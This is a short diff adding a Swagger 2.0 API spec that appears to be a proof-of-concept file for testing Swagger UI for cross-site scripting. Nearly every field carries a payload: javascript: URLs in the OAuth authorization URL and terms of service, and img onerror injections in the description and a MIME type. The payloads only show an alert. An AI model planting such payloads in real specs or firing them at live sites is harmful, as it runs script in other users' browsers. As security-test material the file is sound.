@@ -1,0 +1,20 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: 0xd0ff9
+  description: "<img src=1 onerror=alert(document.domain)>"
+  termsOfService: "javascript:alert(document.domain)"
+paths:
+  /:
+    get:
+      summary: Returns a list of users.
+      description: Optional extended description in Markdown.
+      produces:
+        - application/<img src=1 onerror=alert(document.domain)>
+      responses:
+        200:
+          description: OK
